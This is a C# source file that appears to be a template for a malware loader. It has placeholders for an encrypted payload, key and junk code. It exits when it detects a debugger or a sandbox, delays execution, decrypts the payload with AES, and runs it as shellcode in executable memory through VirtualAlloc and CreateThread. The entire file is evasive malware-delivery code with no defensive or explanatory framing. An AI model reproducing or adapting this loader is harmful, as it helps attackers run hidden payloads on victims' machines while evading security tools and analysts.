using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

class Program
{
    static byte[] ENCRYPTED_PAYLOAD = /* PAYLOAD_PLACEHOLDER */;
    static byte[] ENCRYPTION_KEY = /* KEY_PLACEHOLDER */;
    /* JUNK_PLACEHOLDER */

    [DllImport("kernel32.dll")]
    static extern bool IsDebuggerPresent();

    static void Main()
    {
        // Anti-debug
        if (IsDebuggerPresent() || Debugger.IsAttached)
            Environment.Exit(0);

        // Sandbox detection
        if (Environment.ProcessorCount < 2)
            Environment.Exit(0);

        if (Environment.GetEnvironmentVariable("TEMP").Length < 15)
            Environment.Exit(0);

        // Sleep
        Thread.Sleep(2000);

        try
        {
            byte[] decrypted = Decrypt(ENCRYPTED_PAYLOAD, ENCRYPTION_KEY);
            Execute(decrypted);
            Thread.Sleep(Timeout.Infinite);
        }
        catch
        {
            Environment.Exit(1);
        }
    }

    static byte[] Decrypt(byte[] data, byte[] key)
    {
        using (var aes = new AesManaged())
        {
            aes.Key = key;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            byte[] iv = new byte[16];
            Buffer.BlockCopy(data, 0, iv, 0, 16);
            aes.IV = iv;

            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(data, 16, data.Length - 16))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var result = new MemoryStream())
            {
                cs.CopyTo(result);
                return result.ToArray();
            }
        }
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    const uint MEM_COMMIT = 0x3000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Execute(byte[] payload)
    {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(payload, 0, addr, payload.Length);

        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 2000);
    }
}
